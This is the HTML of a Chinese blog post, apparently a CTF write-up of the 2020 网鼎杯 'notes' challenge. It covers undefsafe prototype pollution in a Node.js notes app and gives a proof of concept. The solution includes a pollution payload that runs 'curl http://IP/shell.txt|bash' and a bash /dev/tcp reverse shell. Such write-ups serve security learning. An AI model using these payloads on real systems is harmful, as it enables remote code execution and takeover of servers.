@@ -1,0 +1,721 @@
+
+  <!DOCTYPE html>
+  <html lang="zh-CN"  >
+  <head>
+  <meta charset="utf-8">
+  
+
+  
+
+  
+
+  <script>window.REIMU_CONFIG = {};window.REIMU_CONFIG.icon_font = '4552607_bq08450reo';window.REIMU_CONFIG.clipboard_tips = {"success":"复制成功(*^▽^*)","fail":"复制失败 (ﾟ⊿ﾟ)ﾂ","copyright":{"enable":false,"count":50,"content":"本文版权：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处！"}};window.REIMU_CONFIG.code_block = {"expand":true};</script>
+  
+  <title>
+    [网鼎杯 2020 青龙组]notes |
+    
+    KL
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin><link rel="preload" as="style" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Mulish:400,400italic,700,700italic%7CNoto%20Serif%20SC:400,400italic,700,700italic&display=swap" media="print" onload="this.media&#x3D;&#39;all&#39;">
+  
+    <link rel="preload" href="//at.alicdn.com/t/c/font_4552607_bq08450reo.woff2" as="font" type="font/woff2" crossorigin="anonymous">
+  
+  
+    
+<link rel="stylesheet" href="/css/loader.css">
+
+  
+  
+    <meta name="description" content="考点：undefsafe函数导致的原型链污染  源码+注释： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889">
+<meta property="og:type" content="article">
+<meta property="og:title" content="[网鼎杯 2020 青龙组]notes">
+<meta property="og:url" content="http://example.com/2025/05/23/[%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84]notes/index.html">
+<meta property="og:site_name" content="KL">
+<meta property="og:description" content="考点：undefsafe函数导致的原型链污染  源码+注释： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/2025/05/23/images/20250523160111866.png">
+<meta property="og:image" content="http://example.com/2025/05/23/images/20250523160232975.png">
+<meta property="article:published_time" content="2025-05-23T07:38:54.000Z">
+<meta property="article:modified_time" content="2025-06-01T10:31:24.197Z">
+<meta property="article:author" content="FuB0Y">
+<meta property="article:tag" content="JS原型链污染">
+<meta property="article:tag" content="NodeJs">
+<meta property="article:tag" content="undefsafe导致原型链污染">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/2025/05/23/images/20250523160111866.png">
+  
+  
+    <link rel="alternate" href="/atom.xml" title="KL" type="application/atom+xml">
+  
+  
+    <link rel="shortcut icon" href="/images/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="preload" href="https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+  
+    
+      
+        
+<link rel="stylesheet" href="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.css">
+
+      
+    
+  
+  
+  
+  
+    
+<script src="https://npm.webcache.cn/pace-js@1.2.4/pace.min.js" integrity="sha384-k6YtvFUEIuEFBdrLKJ3YAUbBki333tj1CSUisai5Cswsg9wcLNaPzsTHDswp4Az8" crossorigin="anonymous"></script>
+
+  
+  
+    
+<link rel="stylesheet" href="https://npm.webcache.cn/@reimujs/aos@0.1.0/dist/aos.css">
+
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body>
+    
+  <div id='loader'>
+    <div class="loading-left-bg loading-bg"></div>
+    <div class="loading-right-bg loading-bg"></div>
+    <div class="spinner-box">
+      <div class="loading-taichi">
+        
+          <svg width="150" height="150" viewBox="0 0 1024 1024" class="icon" version="1.1" xmlns="https://www.w3.org/2000/svg" shape-rendering="geometricPrecision">
+            <path d="M303.5 432A80 80 0 0 1 291.5 592A80 80 0 0 1 303.5 432z" fill="var(--red-1, #ff5252)" />
+            <path d="M512 65A447 447 0 0 1 512 959L512 929A417 417 0 0 0 512 95A417 417 0 0 0 512 929L512 959A447 447 0 0 1 512 65z 
+           M512 95A417 417 0 0 1 929 512A208.5 208.5 0 0 1 720.5 720.5L720.5 592A80 80 0 0 0 720.5 432A80 80 0 0 0 720.5 592L720.5 720.5A208.5 208.5 0 0 1 512 512A208.5 208.5 0 0 0 303.5 303.5A208.5 208.5 0 0 0 95 512A417 417 0 0 1 512 95z" fill="var(--red-1, #ff5252)" />
+          </svg>
+        
+      </div>
+      <div class="loading-word">少女祈祷中...</div>
+    </div>
+  </div>
+  </div>
+  <script>
+    var time = null;
+    var startLoading = () => {
+      time = Date.now();
+      document.getElementById('loader').classList.remove("loading");
+    }
+    var endLoading = () => {
+      if (!time) {
+        document.body.style.overflow = 'auto';
+        document.getElementById('loader').classList.add("loading");
+      } else {
+        if (Date.now() - time > 500) {
+          time = null;
+          document.body.style.overflow = 'auto';
+          document.getElementById('loader').classList.add("loading");
+        } else {
+          setTimeout(endLoading, 500 - (Date.now() - time));
+          time = null;
+        }
+      }
+    }
+    window.addEventListener('DOMContentLoaded', endLoading);
+    document.getElementById('loader').addEventListener('click', endLoading);
+  </script>
+
+<div id="copy-tooltip" style="pointer-events: none; opacity: 0; transition: all 0.2s ease; position: fixed;top: 50%;left: 50%;z-index: 999;transform: translate(-50%, -50%);color: white;background: rgba(0, 0, 0, 0.5);padding: 10px 15px;border-radius: 10px;">
+</div>
+
+
+    <div id="container">
+      <div id="wrap">
+        <div id="header-nav">
+  <nav id="main-nav">
+    
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/">首页</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/archives">归档</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/about">关于</a>
+        </span>
+      
+        <span class="main-nav-link-wrap">
+          <div class="main-nav-icon icon rotate">
+            &#xe62b;
+          </div>
+          <a class="main-nav-link" href="/friend">友链</a>
+        </span>
+      
+    
+    <a id="main-nav-toggle" class="nav-icon"></a>
+  </nav>
+  <nav id="sub-nav">
+    
+      <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS 订阅" target="_blank"></a>
+    
+    
+    
+  </nav>
+</div>
+<header id="header">
+  
+    <picture>
+      
+    </picture>
+    
+      <img fetchpriority="high" src="/images/banner.webp" alt="[网鼎杯 2020 青龙组]notes">
+    
+  
+  <div id="header-outer">
+    <div id="header-title">
+      
+        
+        
+          <a href="/" id="logo">
+            <h1 data-aos="slide-up">[网鼎杯 2020 青龙组]notes</h1>
+          </a>
+        
+      
+      
+        
+        <h2 id="subtitle-wrap" data-aos="slide-down">
+          
+        </h2>
+      
+    </div>
+  </div>
+</header>
+
+        <div id="content"  class="sidebar-right" >
+          <aside id="sidebar">
+  
+  
+  <div class="sidebar-wrapper wrap-sticky">
+    <div class="sidebar-wrap" data-aos="fade-up">
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E6%B3%A8%E9%87%8A"><span class="toc-number">1.</span> <span class="toc-text"> 源码+注释：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">2.</span> <span class="toc-text"> 知识点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#undefsafe"><span class="toc-number">2.1.</span> <span class="toc-text"> undefsafe</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98"><span class="toc-number">3.</span> <span class="toc-text"> 解题</span></a></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">186</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">4</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">179</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+      
+        <div class="sidebar-btn-wrapper" style="position:static">
+          <div class="sidebar-toc-btn current"></div>
+          <div class="sidebar-common-btn"></div>
+        </div>
+      
+    </div>
+  </div>
+
+  <div class="sidebar-widget">
+  
+  </div>
+</aside>
+
+          <section id="main"><article id="post-[网鼎杯 2020 青龙组]notes" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-inner" data-aos="fade-up">
+    <div class="article-meta">
+      <div class="article-date">
+  <a href="/2025/05/23/%5B%E7%BD%91%E9%BC%8E%E6%9D%AF%202020%20%E9%9D%92%E9%BE%99%E7%BB%84%5Dnotes/" class="article-date-link" data-aos="zoom-in">
+    <time datetime="2025-05-23T07:38:54.000Z" itemprop="datePublished">2025-05-23</time>
+    <time style="display: none;" id="post-update-time">2025-06-01</time>
+  </a>
+</div>
+
+      
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E5%88%B7%E9%A2%98/" data-aos="zoom-in">刷题</a>
+  </div>
+
+
+    </div>
+    <div class="hr-line"></div>
+    
+
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+      
+        <p><strong>考点：undefsafe函数导致的原型链污染</strong></p>
+<h2 id="源码注释"><a class="markdownIt-Anchor" href="#源码注释"></a> 源码+注释：</h2>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br></pre></td><td class="code"><pre><span class="line">// 引入Express框架用于构建Web应用</span><br><span class="line">var express = require(&#x27;express&#x27;);</span><br><span class="line">// 引入Path模块用于处理文件路径</span><br><span class="line">var path = require(&#x27;path&#x27;);</span><br><span class="line">// 引入undefsafe库，用于安全访问对象深层属性</span><br><span class="line">const undefsafe = require(&#x27;undefsafe&#x27;);</span><br><span class="line">// 引入child_process模块的exec方法，用于执行系统命令</span><br><span class="line">const &#123; exec &#125; = require(&#x27;child_process&#x27;);</span><br><span class="line"></span><br><span class="line">// 创建Express应用实例</span><br><span class="line">var app = express();</span><br><span class="line"></span><br><span class="line">// 定义笔记类</span><br><span class="line">class Notes &#123;</span><br><span class="line">    constructor() &#123;</span><br><span class="line">        this.owner = &quot;whoknows&quot;;  // 笔记所有者，默认&quot;whoknows&quot;</span><br><span class="line">        this.num = 0;             // 笔记计数器，从0开始</span><br><span class="line">        this.note_list = &#123;&#125;;      // 存储笔记的字典对象</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 添加笔记方法</span><br><span class="line">    write_note(author, raw_note) &#123;</span><br><span class="line">        // 以当前计数器值为键，存储作者和笔记内容</span><br><span class="line">        this.note_list[(this.num++).toString()] = &#123;&quot;author&quot;: author,&quot;raw_note&quot;:raw_note&#125;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 获取单个笔记方法</span><br><span class="line">    get_note(id) &#123;</span><br><span class="line">        var r = &#123;&#125;</span><br><span class="line">        // 使用undefsafe安全访问笔记内容</span><br><span class="line">        undefsafe(r, id, undefsafe(this.note_list, id));</span><br><span class="line">        return r;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 编辑笔记方法</span><br><span class="line">    edit_note(id, author, raw) &#123;</span><br><span class="line">        // 使用undefsafe安全修改作者和内容</span><br><span class="line">        undefsafe(this.note_list, id + &#x27;.author&#x27;, author);</span><br><span class="line">        undefsafe(this.note_list, id + &#x27;.raw_note&#x27;, raw);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 获取所有笔记方法</span><br><span class="line">    get_all_notes() &#123;</span><br><span class="line">        return this.note_list;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 删除笔记方法</span><br><span class="line">    remove_note(id) &#123;</span><br><span class="line">        delete this.note_list[id];  // 删除指定ID的笔记</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 创建Notes实例并添加一条示例笔记</span><br><span class="line">var notes = new Notes();</span><br><span class="line">notes.write_note(&quot;nobody&quot;, &quot;这是nobody的第一条笔记&quot;);</span><br><span class="line"></span><br><span class="line">// 配置Express视图设置</span><br><span class="line">app.set(&#x27;views&#x27;, path.join(__dirname, &#x27;views&#x27;));  // 设置视图文件目录</span><br><span class="line">app.set(&#x27;view engine&#x27;, &#x27;pug&#x27;);                   // 设置模板引擎为Pug</span><br><span class="line"></span><br><span class="line">// 配置中间件</span><br><span class="line">app.use(express.json());                          // 解析JSON格式请求体</span><br><span class="line">app.use(express.urlencoded(&#123; extended: false &#125;)); // 解析URL编码请求体</span><br><span class="line">app.use(express.static(path.join(__dirname, &#x27;public&#x27;))); // 设置静态文件目录</span><br><span class="line"></span><br><span class="line">// 定义首页路由</span><br><span class="line">app.get(&#x27;/&#x27;, function(req, res, next) &#123;</span><br><span class="line">  res.render(&#x27;index&#x27;, &#123; title: &#x27;笔记本&#x27; &#125;);  // 渲染首页视图</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// 添加笔记路由</span><br><span class="line">app.route(&#x27;/add_note&#x27;)</span><br><span class="line">    .get(function(req, res) &#123;  // GET请求处理</span><br><span class="line">        res.render(&#x27;mess&#x27;, &#123;message: &#x27;请使用POST方法添加笔记&#x27;&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(function(req, res) &#123;  // POST请求处理</span><br><span class="line">        let author = req.body.author;  // 获取作者参数</span><br><span class="line">        let raw = req.body.raw;        // 获取笔记内容</span><br><span class="line">        if (author &amp;&amp; raw) &#123;           // 验证参数存在</span><br><span class="line">            notes.write_note(author, raw);  // 调用添加方法</span><br><span class="line">            res.render(&#x27;mess&#x27;, &#123;message: &quot;添加笔记成功&quot;&#125;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            res.render(&#x27;mess&#x27;, &#123;message: &quot;添加笔记失败&quot;&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">// 编辑笔记路由</span><br><span class="line">app.route(&#x27;/edit_note&#x27;)</span><br><span class="line">    .get(function(req, res) &#123;</span><br><span class="line">        res.render(&#x27;mess&#x27;, &#123;message: &quot;请使用POST方法编辑笔记&quot;&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(function(req, res) &#123;</span><br><span class="line">        let id = req.body.id;         // 获取笔记ID</span><br><span class="line">        let author = req.body.author;  // 获取作者</span><br><span class="line">        let enote = req.body.raw;      // 获取新内容</span><br><span class="line">        if (id &amp;&amp; author &amp;&amp; enote) &#123;   // 验证参数</span><br><span class="line">            notes.edit_note(id, author, enote);  // 调用编辑方法</span><br><span class="line">            res.render(&#x27;mess&#x27;, &#123;message: &quot;编辑笔记成功&quot;&#125;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            res.render(&#x27;mess&#x27;, &#123;message: &quot;编辑笔记失败&quot;&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">// 删除笔记路由</span><br><span class="line">app.route(&#x27;/delete_note&#x27;)</span><br><span class="line">    .get(function(req, res) &#123;</span><br><span class="line">        res.render(&#x27;mess&#x27;, &#123;message: &quot;请使用POST方法删除笔记&quot;&#125;);</span><br><span class="line">    &#125;)</span><br><span class="line">    .post(function(req, res) &#123;</span><br><span class="line">        let id = req.body.id;  // 获取要删除的笔记ID</span><br><span class="line">        if (id) &#123;              // 验证ID存在</span><br><span class="line">            notes.remove_note(id);  // 调用删除方法</span><br><span class="line">            res.render(&#x27;mess&#x27;, &#123;message: &quot;删除成功&quot;&#125;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            res.render(&#x27;mess&#x27;, &#123;message: &quot;删除失败&quot;&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">// 查看笔记路由</span><br><span class="line">app.route(&#x27;/notes&#x27;)</span><br><span class="line">    .get(function(req, res) &#123;</span><br><span class="line">        let q = req.query.q;  // 获取查询参数</span><br><span class="line">        let a_note;</span><br><span class="line">        if (typeof(q) === &quot;undefined&quot;) &#123;  // 判断是否查询特定笔记</span><br><span class="line">            a_note = notes.get_all_notes();  // 获取所有笔记</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            a_note = notes.get_note(q);     // 获取指定笔记</span><br><span class="line">        &#125;</span><br><span class="line">        res.render(&#x27;note&#x27;, &#123;list: a_note&#125;);  // 渲染笔记视图</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">// 系统状态路由（存在命令注入风险）</span><br><span class="line">app.route(&#x27;/status&#x27;)</span><br><span class="line">    .get(function(req, res) &#123;</span><br><span class="line">        let commands = &#123;  // 定义要执行的系统命令</span><br><span class="line">            &quot;script-1&quot;: &quot;uptime&quot;,   // 查看系统运行时间</span><br><span class="line">            &quot;script-2&quot;: &quot;free -m&quot;    // 查看内存使用情况</span><br><span class="line">        &#125;;</span><br><span class="line">        // 遍历并执行所有命令</span><br><span class="line">        for (let index in commands) &#123;</span><br><span class="line">            exec(commands[index], &#123;shell:&#x27;/bin/bash&#x27;&#125;, (err, stdout, stderr) =&gt; &#123;</span><br><span class="line">                if (err) &#123;</span><br><span class="line">                    return;</span><br><span class="line">                &#125;</span><br><span class="line">                console.log(`stdout: $&#123;stdout&#125;`);  // 打印命令输出</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        res.send(&#x27;OK&#x27;);  // 返回响应</span><br><span class="line">        res.end();</span><br><span class="line">    &#125;)</span><br><span class="line"></span><br><span class="line">// 404错误处理中间件</span><br><span class="line">app.use(function(req, res, next) &#123;</span><br><span class="line">  res.status(404).send(&#x27;抱歉，找不到该页面！&#x27;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// 500错误处理中间件</span><br><span class="line">app.use(function(err, req, res, next) &#123;</span><br><span class="line">  console.error(err.stack);  // 打印错误堆栈</span><br><span class="line">  res.status(500).send(&#x27;服务器出错！&#x27;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// 启动服务器，监听8080端口</span><br><span class="line">const port = 8080;</span><br><span class="line">app.listen(port, () =&gt; console.log(`应用已启动，访问地址：http://localhost:$&#123;port&#125;`))</span><br></pre></td></tr></table></figure>
+<p>又是nodejs题</p>
+<h2 id="知识点"><a class="markdownIt-Anchor" href="#知识点"></a> 知识点</h2>
+<h3 id="undefsafe"><a class="markdownIt-Anchor" href="#undefsafe"></a> undefsafe</h3>
+<p>之前遇到的都是merge函数导致的原型链污染</p>
+<p>但undefsafe 模块也可以原型链污染。</p>
+<p>undefsafe 是 Nodejs 的一个第三方模块，其核心为一个简单的函数，用来处理访问对象属性不存在时的报错问题。在版本小于2.0.3的<code>undefsafe</code>函数有漏洞，可以污染<strong>所有对象</strong>的原型链，给对象添加属性。</p>
+<p>作用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var object = &#123;</span><br><span class="line">	a: &#123;b: [1,2,3]&#125;</span><br><span class="line">&#125;;</span><br><span class="line">var res = undefsafe(object, &#x27;a.b.0&#x27;, 10);</span><br><span class="line">console.log(object); // &#123; a: &#123; b: [10, 2, 3] &#125; &#125;</span><br><span class="line">//这里可以看见1被替换成了10</span><br></pre></td></tr></table></figure>
+<p>POC：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var a = require(&quot;undefsafe&quot;);</span><br><span class="line">var b = &#123;&#125;;</span><br><span class="line">var c = &#123;&#125;;</span><br><span class="line">var payload = &quot;__proto__.ddd&quot;;</span><br><span class="line">a(b,payload,&quot;JHU&quot;);</span><br><span class="line">console.log(c.ddd);</span><br></pre></td></tr></table></figure>
+<p>污染原型链后，空对象多了个<code>ddd</code>属性，且<code>&#123;&#125;.ddd=JHU</code>。</p>
+<p>漏洞具体：<a target="_blank" rel="noopener" href="https://xianbeil.github.io/2022/03/14/undefsafeStudy/">Undefsafe模块原型链污染(CVE-2019-10795)</a></p>
+<h2 id="解题"><a class="markdownIt-Anchor" href="#解题"></a> 解题</h2>
+<p>回到题目</p>
+<p><strong>/status有命令执行函数</strong>，所以得想办法污染commands对象，例如令commads.a=whoami，然后访问/status它会遍历执行commands字典中的命令。</p>
+<p><img src="../images/20250523160111866.png" alt="image-20250523160111866" /></p>
+<p>在这里用到了undefsafe</p>
+<p><img src="../images/20250523160232975.png" alt="image-20250523160232975" /></p>
+<p>id，author,raw是我们可控的输入</p>
+<p>我们就可以尝试进行污染：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=__proto__&amp;author=curl%20http://IP/shell.txt|bash&amp;raw=a</span><br></pre></td></tr></table></figure>
+<p>shell.txt内容如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/IP/9999 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+<p>直接反弹shell</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/JS%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" rel="tag">JS原型链污染</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/NodeJs/" rel="tag">NodeJs</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/undefsafe%E5%AF%BC%E8%87%B4%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" rel="tag">undefsafe导致原型链污染</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="/images/background-2.jpg" data-sizes="auto" alt="[GFCTF 2021]ez_calc" class="lazyload">
+          
+        
+        <a href="/2025/05/23/%5BGFCTF%202021%5Dez_calc/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            [GFCTF 2021]ez_calc
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/images/1737907114de8a.jpg" data-sizes="auto" alt="[HITCON 2016]Leaking" class="lazyload">
+        
+      
+      <a href="/2025/05/23/%5BHITCON%202016%5DLeaking/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          [HITCON 2016]Leaking
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2025
+      <span class="footer-info-sep rotate"></span>
+      FuB0Y
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        284k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        20:48
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
